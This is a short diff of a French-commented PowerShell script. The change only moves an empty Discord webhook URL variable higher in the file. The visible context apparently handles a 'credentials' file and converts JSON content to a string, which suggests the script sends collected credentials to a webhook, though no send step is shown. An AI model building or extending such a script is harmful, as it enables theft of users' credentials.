@@ -1,6 +1,10 @@
 # Utilisez le dossier actuel pour le téléchargement du fichier
 $downloadPath = (Get-Location).Path
 
+# Spécifiez l'URL du webhook Discord
+$webhookUrl = ""
+
+
 if (!(Test-Path -Path $downloadPath)) {
     New-Item -Path $downloadPath -ItemType Directory
 }
@@ -39,10 +43,6 @@ else {
     Write-Host "Fichier 'credentials' non trouvé."
 }
 
-
-
-# Spécifiez l'URL du webhook Discord
-$webhookUrl = ""
 
 # Convertir le contenu JSON en une chaîne de caractères
 $jsonString = $jsonContent | Out-String
